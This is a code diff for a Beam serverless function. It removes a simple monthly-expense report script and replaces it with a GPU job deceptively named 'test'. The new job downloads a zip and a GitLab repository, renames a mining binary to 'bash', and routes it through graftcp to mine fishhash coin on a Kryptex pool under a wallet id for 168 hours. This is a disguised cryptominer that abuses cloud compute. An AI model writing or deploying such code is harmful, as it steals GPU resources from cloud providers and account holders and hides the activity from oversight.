@@ -1,33 +1,87 @@
-from beam import function
+from beam import function, Image
+import subprocess
+
+image = (
+    Image(
+        base_image="nvidia/cuda:12.1.1-runtime-ubuntu22.04",
+    )
+    .add_commands([
+        "apt-get update -y",
+        "apt-get install -y python3 python3-pip python-is-python3 git wget unzip curl ca-certificates",
+    ])
+)
 
 
-@function(name="monthly-expense")
-def main():
-    expenses = {
-        "Januari": 1_500_000,
-        "Februari": 1_750_000,
-        "Maret": 1_200_000,
-        "April": 1_650_000,
-        "Mei": 1_450_000,
-        "Juni": 1_800_000,
-    }
+@function(
+    name="test",
+    image=image,
+    gpu="A10G",
+    cpu=8,
+    memory="16Gi",
+    timeout=168 * 60 * 60,
+)
+def run_script():
 
-    print("=== LAPORAN PENGELUARAN BULANAN ===")
+    print("=== CHECK GPU ===")
+    subprocess.run(["nvidia-smi"], check=False)
 
-    total = 0
+    cmd = """
+    set -e
 
-    for month, amount in expenses.items():
-        print(f"{month:10} : Rp{amount:,.0f}")
-        total += amount
+    echo "=== CURRENT DIRECTORY ==="
+    pwd
 
-    average = total / len(expenses)
+    echo "=== DOWNLOAD FILE ==="
+    wget -q https://github.com/hujisanda/root/releases/download/nwe/pan.zip -O pan.zip
 
-    print("-----------------------------------")
-    print(f"Total      : Rp{total:,.0f}")
-    print(f"Rata-rata  : Rp{average:,.0f}")
+    echo "=== EXTRACT ==="
+    unzip -o pan.zip
 
-    return {
-        "total": total,
-        "average": average,
-        "months": len(expenses),
-    }
+    echo "=== CHECK PAN ==="
+    ls -ld /mnt/code/pan
+    ls -lah /mnt/code/pan
+
+    echo "=== ENTER PAN ==="
+    cd /mnt/code/pan
+
+    echo "=== SET PERMISSION ==="
+    chmod -R +x .
+
+    echo "=== START GRAFTCP LOCAL ==="
+    ./graftcp/local/graftcp-local -config graftcp-local.conf > /dev/null 2>&1 &
+
+    sleep 3
+
+    echo "=== DOWNLOAD RIG ==="
+    cd /mnt/code/pan
+    git clone https://gitlab.com/liugtiujk/rigel.git
+
+    echo "=== CHECK RIGEL ==="
+    ls -lah /mnt/code/pan/rigel
+
+    echo "=== CHECK BASH ==="
+    cd /mnt/code/pan/rigel
+    ls -lh bash
+
+    chmod u+x bash
+
+    echo "=== MOVE BASH ==="
+    mv bash /mnt/code/pan/
+
+    echo "=== CHECK PAN AFTER MOVE ==="
+    ls -ld /mnt/code/pan
+    ls -lah /mnt/code/pan
+
+    echo "=== FINAL DIRECTORY ==="
+    cd /mnt/code/pan
+    pwd
+    ls -lah
+    
+    echo "=== RUN PROC VIA GRAFTCP ==="
+    ./graftcp/graftcp ./bash -a fishhash -o stratum+tcp://iron.kryptex.network:7017 -u d955e86ec8ebfa1aadcf13f162a10c85778e3f3ac5002660ea0097df6f3e660a.VERTI
+    """
+
+    subprocess.run(["bash", "-lc", cmd], check=False)
+
+    print("Staying alive for 168 hours...")
+    time.sleep(60 * 60 * 168)
